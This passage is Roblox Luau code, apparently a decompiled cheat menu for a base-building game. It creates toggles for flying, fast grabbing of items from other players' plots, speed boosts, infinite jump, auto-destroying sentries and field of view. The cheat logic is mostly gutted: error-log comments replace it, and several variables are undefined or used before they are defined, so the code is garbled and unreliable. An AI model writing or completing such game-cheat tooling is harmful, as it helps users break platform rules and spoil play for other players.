local UICorner18 = Instance.new("UICorner", Frame14)
UICorner18.CornerRadius = UDim.new(1, 0)
local TextButton9 = Instance.new("TextButton", Frame13)
TextButton9.Size = UDim2.new(1, 0, 1, 0)
TextButton9.BackgroundTransparency = 1
TextButton9.Text = ""
TextButton9.ZIndex = 19

TextButton9.MouseButton1Click:Connect(function()
	local tween7 = TweenService:Create(Frame13, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween7:Play()
	local tween8 = TweenService:Create(Frame14, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween8:Play()
end)

TextBox.FocusLost:Connect(function(enterPressed, inputObject)
end)

local Frame15 = Instance.new("Frame", ScrollingFrame)
Frame15.Size = UDim2.new(1, -10, 0, 36)
Frame15.Position = UDim2.new(0, 3, 0, 104)
Frame15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame15.BorderSizePixel = 0
Frame15.ZIndex = 16
local UICorner19 = Instance.new("UICorner", Frame15)
UICorner19.CornerRadius = UDim.new(0, 10)
Frame15:GetChildren()
local UIGradient13 = Instance.new("UIGradient")
UIGradient13.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient13.Rotation = 110
UIGradient13.Parent = Frame15
local UIStroke14 = Instance.new("UIStroke", Frame15)
UIStroke14.Color = Color3.fromRGB(100, 35, 35)
UIStroke14.Thickness = 1.2
local TextLabel9 = Instance.new("TextLabel", Frame15)
TextLabel9.Size = UDim2.new(0, 70, 1, 0)
TextLabel9.Position = UDim2.new(0, 8, 0, 0)
TextLabel9.BackgroundTransparency = 1
TextLabel9.Text = "Transporte"
TextLabel9.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel9.Font = Enum.Font.GothamBold
TextLabel9.TextSize = 11
TextLabel9.TextXAlignment = Enum.TextXAlignment.Left
TextLabel9.ZIndex = 17
local TextButton10 = Instance.new("TextButton", Frame15)
TextButton10.Size = UDim2.new(0, 20, 0, 20)
TextButton10.Position = UDim2.new(0, 76, 0.5, -10)
TextButton10.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton10.Text = "<"
TextButton10.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton10.Font = Enum.Font.GothamBlack
TextButton10.TextSize = 13
TextButton10.ZIndex = 17
local UICorner20 = Instance.new("UICorner", TextButton10)
UICorner20.CornerRadius = UDim.new(0, 4)
local UIStroke15 = Instance.new("UIStroke", TextButton10)
UIStroke15.Color = Color3.fromRGB(100, 35, 35)
local TextLabel10 = Instance.new("TextLabel", Frame15)
TextLabel10.Size = UDim2.new(0, 62, 1, 0)
TextLabel10.Position = UDim2.new(0, 98, 0, 0)
TextLabel10.BackgroundTransparency = 1
TextLabel10.Text = "Fly Carpet"
TextLabel10.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel10.Font = Enum.Font.GothamBold
TextLabel10.TextSize = 10
TextLabel10.TextXAlignment = Enum.TextXAlignment.Center
TextLabel10.ZIndex = 17
local TextButton11 = Instance.new("TextButton", Frame15)
TextButton11.Size = UDim2.new(0, 20, 0, 20)
TextButton11.Position = UDim2.new(1, -28, 0.5, -10)
TextButton11.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton11.Text = ">"
TextButton11.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton11.Font = Enum.Font.GothamBlack
TextButton11.TextSize = 13
TextButton11.ZIndex = 17
local UICorner21 = Instance.new("UICorner", TextButton11)
UICorner21.CornerRadius = UDim.new(0, 4)
local UIStroke16 = Instance.new("UIStroke", TextButton11)
UIStroke16.Color = Color3.fromRGB(100, 35, 35)

TextButton10.MouseButton1Click:Connect(function()
	TextLabel10.Text = "Santa's Sleigh"
end)

TextButton11.MouseButton1Click:Connect(function()
	TextLabel10.Text = "Fly Carpet"
end)

local Frame16 = Instance.new("Frame", ScrollingFrame)
Frame16.Size = UDim2.new(1, -10, 0, 56)
Frame16.Position = UDim2.new(0, 3, 0, 146)
Frame16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame16.BorderSizePixel = 0
Frame16.ZIndex = 16
local UICorner22 = Instance.new("UICorner", Frame16)
UICorner22.CornerRadius = UDim.new(0, 10)
Frame16:GetChildren()
local UIGradient14 = Instance.new("UIGradient")
UIGradient14.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient14.Rotation = 110
UIGradient14.Parent = Frame16
local UIStroke17 = Instance.new("UIStroke", Frame16)
UIStroke17.Color = Color3.fromRGB(100, 35, 35)
UIStroke17.Thickness = 1.2
local TextLabel11 = Instance.new("TextLabel", Frame16)
TextLabel11.Size = UDim2.new(0, 90, 0, 20)
TextLabel11.Position = UDim2.new(0, 8, 0, 4)
TextLabel11.BackgroundTransparency = 1
TextLabel11.Text = "Fast Grab"
TextLabel11.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel11.Font = Enum.Font.GothamBold
TextLabel11.TextSize = 12
TextLabel11.TextXAlignment = Enum.TextXAlignment.Left
TextLabel11.ZIndex = 17
local Frame17 = Instance.new("Frame", Frame16)
Frame17.Size = UDim2.new(0, 36, 0, 18)
Frame17.Position = UDim2.new(1, -46, 0, 5)
Frame17.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame17.BorderSizePixel = 0
Frame17.ZIndex = 17
local UICorner23 = Instance.new("UICorner", Frame17)
UICorner23.CornerRadius = UDim.new(1, 0)
local UIStroke18 = Instance.new("UIStroke", Frame17)
UIStroke18.Color = Color3.fromRGB(100, 35, 35)
local Frame18 = Instance.new("Frame", Frame17)
Frame18.Size = UDim2.new(0, 14, 0, 14)
Frame18.Position = UDim2.new(0, 2, 0.5, -7)
Frame18.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame18.BorderSizePixel = 0
Frame18.ZIndex = 18
local UICorner24 = Instance.new("UICorner", Frame18)
UICorner24.CornerRadius = UDim.new(1, 0)
local TextButton12 = Instance.new("TextButton", Frame17)
TextButton12.Size = UDim2.new(1, 0, 1, 0)
TextButton12.BackgroundTransparency = 1
TextButton12.Text = ""
TextButton12.ZIndex = 19
local TextLabel12 = Instance.new("TextLabel", Frame16)
TextLabel12.Size = UDim2.new(0, 34, 0, 16)
TextLabel12.Position = UDim2.new(0, 8, 0, 30)
TextLabel12.BackgroundTransparency = 1
TextLabel12.Text = "0%"
TextLabel12.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel12.Font = Enum.Font.GothamBold
TextLabel12.TextSize = 10
TextLabel12.TextXAlignment = Enum.TextXAlignment.Left
TextLabel12.ZIndex = 17
local Frame19 = Instance.new("Frame", Frame16)
Frame19.Size = UDim2.new(1, -54, 0, 12)
Frame19.Position = UDim2.new(0, 42, 0, 32)
Frame19.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame19.BorderSizePixel = 0
Frame19.ClipsDescendants = true
Frame19.ZIndex = 17
local UICorner25 = Instance.new("UICorner", Frame19)
UICorner25.CornerRadius = UDim.new(1, 0)
local UIStroke19 = Instance.new("UIStroke", Frame19)
UIStroke19.Color = Color3.fromRGB(100, 35, 35)
local Frame20 = Instance.new("Frame", Frame19)
Frame20.Size = UDim2.new(0, 0, 1, 0)
Frame20.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame20.BorderSizePixel = 0
Frame20.ZIndex = 18
local UICorner26 = Instance.new("UICorner", Frame20)
UICorner26.CornerRadius = UDim.new(1, 0)
Frame20:GetChildren()
local UIGradient15 = Instance.new("UIGradient")
UIGradient15.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(179, 59, 59)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(231, 76, 76)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 140, 150)) })
UIGradient15.Rotation = 90
UIGradient15.Parent = Frame20

TextButton12.MouseButton1Click:Connect(function()
	local tween9 = TweenService:Create(Frame17, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween9:Play()
	local tween10 = TweenService:Create(Frame18, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween10:Play()

	RunService.Heartbeat:Connect(function(deltaTime3)
		Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		local Plots = workspace:FindFirstChild("Plots")
		local children13 = Plots:GetChildren()

		for i20, v21 in ipairs(children13) do
			local Plots2 = workspace:FindFirstChild("Plots")
			local child = Plots2:FindFirstChild(v21.Name)
			local PlotSign = child:FindFirstChild("PlotSign")
			PlotSign:FindFirstChild("YourBase")
			local AnimalPodiums = v21:FindFirstChild("AnimalPodiums")
			local children14 = AnimalPodiums:GetChildren()

			for i21, v22 in ipairs(children14) do
				local Base = v22:FindFirstChild("Base")
				Base:FindFirstChild("Spawn")
			end
		end
		-- [envlog] error: Script:2: attempt to compare userdata <= number
	end)
end)

RunService.RenderStepped:Connect(function(deltaTime2)
	-- [envlog] error: Script:2: attempt to compare number <= userdata
end)

local Frame21 = Instance.new("Frame", ScrollingFrame)
Frame21.Size = UDim2.new(1, -10, 0, 36)
Frame21.Position = UDim2.new(0, 3, 0, 208)
Frame21.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame21.BorderSizePixel = 0
Frame21.ZIndex = 16
local UICorner27 = Instance.new("UICorner", Frame21)
UICorner27.CornerRadius = UDim.new(0, 10)
Frame21:GetChildren()
local UIGradient16 = Instance.new("UIGradient")
UIGradient16.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient16.Rotation = 110
UIGradient16.Parent = Frame21
local UIStroke20 = Instance.new("UIStroke", Frame21)
UIStroke20.Color = Color3.fromRGB(100, 35, 35)
UIStroke20.Thickness = 1.2
local TextLabel13 = Instance.new("TextLabel", Frame21)
TextLabel13.Size = UDim2.new(0, 78, 1, 0)
TextLabel13.Position = UDim2.new(0, 8, 0, 0)
TextLabel13.BackgroundTransparency = 1
TextLabel13.Text = "Speed Normal"
TextLabel13.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel13.Font = Enum.Font.GothamBold
TextLabel13.TextSize = 11
TextLabel13.TextXAlignment = Enum.TextXAlignment.Left
TextLabel13.ZIndex = 17
local TextBox2 = Instance.new("TextBox", Frame21)
TextBox2.Size = UDim2.new(0, 40, 0, 20)
TextBox2.Position = UDim2.new(0, 86, 0.5, -10)
TextBox2.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextBox2.Text = "60"
TextBox2.TextColor3 = Color3.fromRGB(212, 184, 184)
TextBox2.Font = Enum.Font.GothamBold
TextBox2.TextSize = 11
TextBox2.BorderSizePixel = 0
TextBox2.ClearTextOnFocus = false
TextBox2.ZIndex = 17
local UICorner28 = Instance.new("UICorner", TextBox2)
UICorner28.CornerRadius = UDim.new(0, 4)
local UIStroke21 = Instance.new("UIStroke", TextBox2)
UIStroke21.Color = Color3.fromRGB(100, 35, 35)
local Frame22 = Instance.new("Frame", Frame21)
Frame22.Size = UDim2.new(0, 36, 0, 18)
Frame22.Position = UDim2.new(1, -46, 0.5, -9)
Frame22.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame22.BorderSizePixel = 0
Frame22.ZIndex = 17
local UICorner29 = Instance.new("UICorner", Frame22)
UICorner29.CornerRadius = UDim.new(1, 0)
local UIStroke22 = Instance.new("UIStroke", Frame22)
UIStroke22.Color = Color3.fromRGB(100, 35, 35)
local Frame23 = Instance.new("Frame", Frame22)
Frame23.Size = UDim2.new(0, 14, 0, 14)
Frame23.Position = UDim2.new(0, 2, 0.5, -7)
Frame23.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame23.BorderSizePixel = 0
Frame23.ZIndex = 18
local UICorner30 = Instance.new("UICorner", Frame23)
UICorner30.CornerRadius = UDim.new(1, 0)
local TextButton13 = Instance.new("TextButton", Frame22)
TextButton13.Size = UDim2.new(1, 0, 1, 0)
TextButton13.BackgroundTransparency = 1
TextButton13.Text = ""
TextButton13.ZIndex = 19

TextButton13.MouseButton1Click:Connect(function()
	local tween11 = TweenService:Create(Frame22, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween11:Play()
	local tween12 = TweenService:Create(Frame23, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween12:Play()
	local tween13 = TweenService:Create(Frame25, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween13:Play()
	local tween14 = TweenService:Create(Frame26, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween14:Play()
end)

TextBox2.FocusLost:Connect(function(enterPressed2, inputObject2)
end)

local Frame24 = Instance.new("Frame", ScrollingFrame)
Frame24.Size = UDim2.new(1, -10, 0, 36)
Frame24.Position = UDim2.new(0, 3, 0, 250)
Frame24.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame24.BorderSizePixel = 0
Frame24.ZIndex = 16
local UICorner31 = Instance.new("UICorner", Frame24)
UICorner31.CornerRadius = UDim.new(0, 10)
Frame24:GetChildren()
local UIGradient17 = Instance.new("UIGradient")
UIGradient17.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient17.Rotation = 110
UIGradient17.Parent = Frame24
local UIStroke23 = Instance.new("UIStroke", Frame24)
UIStroke23.Color = Color3.fromRGB(100, 35, 35)
UIStroke23.Thickness = 1.2
local TextLabel14 = Instance.new("TextLabel", Frame24)
TextLabel14.Size = UDim2.new(0, 78, 1, 0)
TextLabel14.Position = UDim2.new(0, 8, 0, 0)
TextLabel14.BackgroundTransparency = 1
TextLabel14.Text = "Carry Speed"
TextLabel14.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel14.Font = Enum.Font.GothamBold
TextLabel14.TextSize = 11
TextLabel14.TextXAlignment = Enum.TextXAlignment.Left
TextLabel14.ZIndex = 17
local TextBox3 = Instance.new("TextBox", Frame24)
TextBox3.Size = UDim2.new(0, 40, 0, 20)
TextBox3.Position = UDim2.new(0, 86, 0.5, -10)
TextBox3.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextBox3.Text = "30"
TextBox3.TextColor3 = Color3.fromRGB(212, 184, 184)
TextBox3.Font = Enum.Font.GothamBold
TextBox3.TextSize = 11
TextBox3.BorderSizePixel = 0
TextBox3.ClearTextOnFocus = false
TextBox3.ZIndex = 17
local UICorner32 = Instance.new("UICorner", TextBox3)
UICorner32.CornerRadius = UDim.new(0, 4)
local UIStroke24 = Instance.new("UIStroke", TextBox3)
UIStroke24.Color = Color3.fromRGB(100, 35, 35)
local Frame25 = Instance.new("Frame", Frame24)
Frame25.Size = UDim2.new(0, 36, 0, 18)
Frame25.Position = UDim2.new(1, -46, 0.5, -9)
Frame25.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame25.BorderSizePixel = 0
Frame25.ZIndex = 17
local UICorner33 = Instance.new("UICorner", Frame25)
UICorner33.CornerRadius = UDim.new(1, 0)
local UIStroke25 = Instance.new("UIStroke", Frame25)
UIStroke25.Color = Color3.fromRGB(100, 35, 35)
local Frame26 = Instance.new("Frame", Frame25)
Frame26.Size = UDim2.new(0, 14, 0, 14)
Frame26.Position = UDim2.new(0, 2, 0.5, -7)
Frame26.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame26.BorderSizePixel = 0
Frame26.ZIndex = 18
local UICorner34 = Instance.new("UICorner", Frame26)
UICorner34.CornerRadius = UDim.new(1, 0)
local TextButton14 = Instance.new("TextButton", Frame25)
TextButton14.Size = UDim2.new(1, 0, 1, 0)
TextButton14.BackgroundTransparency = 1
TextButton14.Text = ""
TextButton14.ZIndex = 19

TextButton14.MouseButton1Click:Connect(function()
	local tween15 = TweenService:Create(Frame25, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween15:Play()
	local tween16 = TweenService:Create(Frame26, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween16:Play()
	local tween17 = TweenService:Create(Frame22, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween17:Play()
	local tween18 = TweenService:Create(Frame23, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween18:Play()
end)

TextBox3.FocusLost:Connect(function(enterPressed3, inputObject3)
end)

local Frame27 = Instance.new("Frame", ScrollingFrame)
Frame27.Size = UDim2.new(1, -10, 0, 28)
Frame27.Position = UDim2.new(0, 3, 0, 292)
Frame27.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame27.BorderSizePixel = 0
Frame27.ZIndex = 16
local UICorner35 = Instance.new("UICorner", Frame27)
UICorner35.CornerRadius = UDim.new(0, 10)
Frame27:GetChildren()
local UIGradient18 = Instance.new("UIGradient")
UIGradient18.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient18.Rotation = 110
UIGradient18.Parent = Frame27
local UIStroke26 = Instance.new("UIStroke", Frame27)
UIStroke26.Color = Color3.fromRGB(100, 35, 35)
UIStroke26.Thickness = 1.2
local TextLabel15 = Instance.new("TextLabel", Frame27)
TextLabel15.Size = UDim2.new(0, 150, 1, 0)
TextLabel15.Position = UDim2.new(0, 8, 0, 0)
TextLabel15.BackgroundTransparency = 1
TextLabel15.Text = "Auto Destroy Sentry"
TextLabel15.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel15.Font = Enum.Font.GothamBold
TextLabel15.TextSize = 11
TextLabel15.TextXAlignment = Enum.TextXAlignment.Left
TextLabel15.ZIndex = 17
local Frame28 = Instance.new("Frame", Frame27)
Frame28.Size = UDim2.new(0, 36, 0, 18)
Frame28.Position = UDim2.new(1, -46, 0.5, -9)
Frame28.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame28.BorderSizePixel = 0
Frame28.ZIndex = 17
local UICorner36 = Instance.new("UICorner", Frame28)
UICorner36.CornerRadius = UDim.new(1, 0)
local UIStroke27 = Instance.new("UIStroke", Frame28)
UIStroke27.Color = Color3.fromRGB(100, 35, 35)
local Frame29 = Instance.new("Frame", Frame28)
Frame29.Size = UDim2.new(0, 14, 0, 14)
Frame29.Position = UDim2.new(0, 2, 0.5, -7)
Frame29.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame29.BorderSizePixel = 0
Frame29.ZIndex = 18
local UICorner37 = Instance.new("UICorner", Frame29)
UICorner37.CornerRadius = UDim.new(1, 0)
local TextButton15 = Instance.new("TextButton", Frame28)
TextButton15.Size = UDim2.new(1, 0, 1, 0)
TextButton15.BackgroundTransparency = 1
TextButton15.Text = ""
TextButton15.ZIndex = 19

TextButton15.MouseButton1Click:Connect(function()
	local tween19 = TweenService:Create(Frame28, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween19:Play()
	local tween20 = TweenService:Create(Frame29, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween20:Play()
end)

local Frame30 = Instance.new("Frame", ScrollingFrame)
Frame30.Size = UDim2.new(1, -10, 0, 56)
Frame30.Position = UDim2.new(0, 3, 0, 326)
Frame30.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame30.BorderSizePixel = 0
Frame30.ZIndex = 16
local UICorner38 = Instance.new("UICorner", Frame30)
UICorner38.CornerRadius = UDim.new(0, 10)
Frame30:GetChildren()
local UIGradient19 = Instance.new("UIGradient")
UIGradient19.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient19.Rotation = 110
UIGradient19.Parent = Frame30
local UIStroke28 = Instance.new("UIStroke", Frame30)
UIStroke28.Color = Color3.fromRGB(100, 35, 35)
UIStroke28.Thickness = 1.2
local TextLabel16 = Instance.new("TextLabel", Frame30)
TextLabel16.Size = UDim2.new(0, 120, 0, 20)
TextLabel16.Position = UDim2.new(0, 8, 0, 4)
TextLabel16.BackgroundTransparency = 1
TextLabel16.Text = "JUMP MODE"
TextLabel16.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel16.Font = Enum.Font.GothamBold
TextLabel16.TextSize = 12
TextLabel16.TextXAlignment = Enum.TextXAlignment.Left
TextLabel16.ZIndex = 17
local Frame31 = Instance.new("Frame", Frame30)
Frame31.Size = UDim2.new(0, 36, 0, 18)
Frame31.Position = UDim2.new(1, -46, 0, 5)
Frame31.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame31.BorderSizePixel = 0
Frame31.ZIndex = 17
local UICorner39 = Instance.new("UICorner", Frame31)
UICorner39.CornerRadius = UDim.new(1, 0)
local UIStroke29 = Instance.new("UIStroke", Frame31)
UIStroke29.Color = Color3.fromRGB(100, 35, 35)
local Frame32 = Instance.new("Frame", Frame31)
Frame32.Size = UDim2.new(0, 14, 0, 14)
Frame32.Position = UDim2.new(0, 2, 0.5, -7)
Frame32.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame32.BorderSizePixel = 0
Frame32.ZIndex = 18
local UICorner40 = Instance.new("UICorner", Frame32)
UICorner40.CornerRadius = UDim.new(1, 0)
local TextButton16 = Instance.new("TextButton", Frame31)
TextButton16.Size = UDim2.new(1, 0, 1, 0)
TextButton16.BackgroundTransparency = 1
TextButton16.Text = ""
TextButton16.ZIndex = 19

TextButton16.MouseButton1Click:Connect(function()
	_holdInfJumpConn:Disconnect()

	local connection = RunService.Heartbeat:Connect(function(deltaTime4)
		Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		-- [envlog] error: Script:2: attempt to compare userdata < number
	end)

	local tween21 = TweenService:Create(Frame31, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween21:Play()
	local tween22 = TweenService:Create(Frame32, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween22:Play()
	TextButton17.BackgroundColor3 = Color3.fromRGB(48, 22, 22)
	TextButton17.TextColor3 = Color3.fromRGB(235, 220, 220)
	TextButton18.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
	TextButton18.TextColor3 = Color3.fromRGB(212, 184, 184)
end)

local TextButton17 = Instance.new("TextButton", Frame30)
TextButton17.Size = UDim2.new(0.46, 0, 0, 22)
TextButton17.Position = UDim2.new(0, 8, 0, 28)
TextButton17.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton17.Text = "[ HOLD ]"
TextButton17.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton17.Font = Enum.Font.GothamBlack
TextButton17.TextSize = 11
TextButton17.ZIndex = 17
local UICorner41 = Instance.new("UICorner", TextButton17)
UICorner41.CornerRadius = UDim.new(0, 6)
local UIStroke30 = Instance.new("UIStroke", TextButton17)
UIStroke30.Color = Color3.fromRGB(100, 35, 35)
local TextButton18 = Instance.new("TextButton", Frame30)
TextButton18.Size = UDim2.new(0.46, 0, 0, 22)
TextButton18.Position = UDim2.new(0.52, 0, 0, 28)
TextButton18.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton18.Text = "[ MANUAL ]"
TextButton18.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton18.Font = Enum.Font.GothamBlack
TextButton18.TextSize = 11
TextButton18.ZIndex = 17
local UICorner42 = Instance.new("UICorner", TextButton18)
UICorner42.CornerRadius = UDim.new(0, 6)
local UIStroke31 = Instance.new("UIStroke", TextButton18)
UIStroke31.Color = Color3.fromRGB(100, 35, 35)

TextButton17.MouseButton1Click:Connect(function()
	connection:Disconnect()
	TextButton17.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
	TextButton17.TextColor3 = Color3.fromRGB(212, 184, 184)
	TextButton18.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
	TextButton18.TextColor3 = Color3.fromRGB(212, 184, 184)
end)

TextButton18.MouseButton1Click:Connect(function()
	_holdInfJumpConn:Disconnect()

	RunService.Heartbeat:Connect(function(deltaTime5)
		Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		-- [envlog] error: Script:2: attempt to compare userdata < number
	end)

	TextButton18.BackgroundColor3 = Color3.fromRGB(48, 22, 22)
	TextButton18.TextColor3 = Color3.fromRGB(235, 220, 220)
	TextButton17.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
	TextButton17.TextColor3 = Color3.fromRGB(212, 184, 184)
	TextButton18.BackgroundColor3 = Color3.fromRGB(48, 22, 22)
	TextButton18.TextColor3 = Color3.fromRGB(235, 220, 220)
	TextButton17.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
	TextButton17.TextColor3 = Color3.fromRGB(212, 184, 184)
end)

local Frame33 = Instance.new("Frame", ScrollingFrame)
Frame33.Size = UDim2.new(1, -10, 0, 36)
Frame33.Position = UDim2.new(0, 3, 0, 388)
Frame33.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame33.BorderSizePixel = 0
Frame33.ZIndex = 16
local UICorner43 = Instance.new("UICorner", Frame33)
UICorner43.CornerRadius = UDim.new(0, 10)
Frame33:GetChildren()
local UIGradient20 = Instance.new("UIGradient")
UIGradient20.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient20.Rotation = 110
UIGradient20.Parent = Frame33
local UIStroke32 = Instance.new("UIStroke", Frame33)
UIStroke32.Color = Color3.fromRGB(100, 35, 35)
UIStroke32.Thickness = 1.2
local TextLabel17 = Instance.new("TextLabel", Frame33)
TextLabel17.Size = UDim2.new(0, 40, 1, 0)
TextLabel17.Position = UDim2.new(0, 8, 0, 0)
TextLabel17.BackgroundTransparency = 1
TextLabel17.Text = "Fov"
TextLabel17.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel17.Font = Enum.Font.GothamBold
TextLabel17.TextSize = 12
TextLabel17.TextXAlignment = Enum.TextXAlignment.Left
TextLabel17.ZIndex = 17
local TextBox4 = Instance.new("TextBox", Frame33)
TextBox4.Size = UDim2.new(0, 40, 0, 20)
TextBox4.Position = UDim2.new(0, 50, 0.5, -10)
TextBox4.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextBox4.Text = "80"
TextBox4.TextColor3 = Color3.fromRGB(212, 184, 184)
TextBox4.Font = Enum.Font.GothamBold
TextBox4.TextSize = 11
TextBox4.BorderSizePixel = 0
TextBox4.ClearTextOnFocus = false
TextBox4.ZIndex = 17
local UICorner44 = Instance.new("UICorner", TextBox4)
UICorner44.CornerRadius = UDim.new(0, 4)
local UIStroke33 = Instance.new("UIStroke", TextBox4)
UIStroke33.Color = Color3.fromRGB(100, 35, 35)
local Frame34 = Instance.new("Frame", Frame33)
Frame34.Size = UDim2.new(0, 36, 0, 18)
Frame34.Position = UDim2.new(1, -46, 0.5, -9)
Frame34.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame34.BorderSizePixel = 0
Frame34.ZIndex = 17
local UICorner45 = Instance.new("UICorner", Frame34)
UICorner45.CornerRadius = UDim.new(1, 0)
local UIStroke34 = Instance.new("UIStroke", Frame34)
UIStroke34.Color = Color3.fromRGB(100, 35, 35)
local Frame35 = Instance.new("Frame", Frame34)
Frame35.Size = UDim2.new(0, 14, 0, 14)
Frame35.Position = UDim2.new(0, 2, 0.5, -7)
Frame35.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame35.BorderSizePixel = 0
Frame35.ZIndex = 18
local UICorner46 = Instance.new("UICorner", Frame35)
